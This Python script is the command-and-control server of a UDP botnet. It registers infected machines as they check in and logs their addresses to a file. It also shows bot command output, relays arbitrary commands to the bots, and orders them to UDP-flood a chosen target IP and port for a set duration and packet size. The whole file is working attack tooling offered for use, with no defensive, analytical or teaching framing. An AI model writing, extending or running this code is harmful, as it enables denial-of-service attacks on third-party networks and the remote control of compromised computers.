import socket,sys,time,os,subprocess,threading,time,random


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

print('''UDP CNC BOTNET
         Commands: showip = shows all infected machines
                   showbotoutput = show all bot command outputs
                   udp = force all bots to udpflood a host''')
randsport = random.randint(40000,65535)

s.bind((local_ip, randsport))

ip = sys.argv[1]
port = int(sys.argv[2])
iplist = []
botcmdlist = []

def cnc():
  while 1:
    data,addr = s.recvfrom(999999)
    ipaddr = addr[0]
    port = addr[1]
    address = (ipaddr, port)
    txtaddr = f"{ipaddr}|{port}"
    iplist.append(address)
    set(iplist)
    botcmdlist.append(data)
    set(botcmdlist)
    print(data.decode())
    with open("botlst.txt", "w") as file:
       file.write(txtaddr)
    #servertxtcoded = (f"{data}{addr}")
    #servertextcoded = (f"{chatlist}").strip()
    #s.sendto(servertextcoded.encode("ascii"), (ip,port))
    #cnc()
    
def display():
   time.sleep(130)
   print(iplist)
   display()

def control():
  cmd = input("Enter Command :")
  if cmd == "showip":
     print(iplist)
     control()
  elif cmd == "showbotoutput":
     print(botcmdlist)
     control()
  elif cmd == "udp":
     s.sendto(cmd.encode('ascii'), (ip,port))
     targetip = input("Enter Target IP :")
     s.sendto(targetip.encode('ascii'), (ip,port))
     targetport = input("Enter Target Port :")
     s.sendto(targetport.encode('ascii'), (ip,port))
     txtime = input("Enter Attack Time in Seconds :")
     s.sendto(txtime.encode('ascii'), (ip,port))
     txsize = input("Enter Packet Size :")
     s.sendto(txsize.encode('ascii'), (ip,port))
     #both = f"{targetip}{targetport}"
     #s.sendto(both.encode("ascii"), (ip,port))
     control()
  else:
    s.sendto(cmd.encode('ascii'), (ip,port))
    control()


   
one = threading.Thread(target=display)
two = threading.Thread(target=cnc)
three = threading.Thread(target=control)
one.start()
two.start()
three.start()

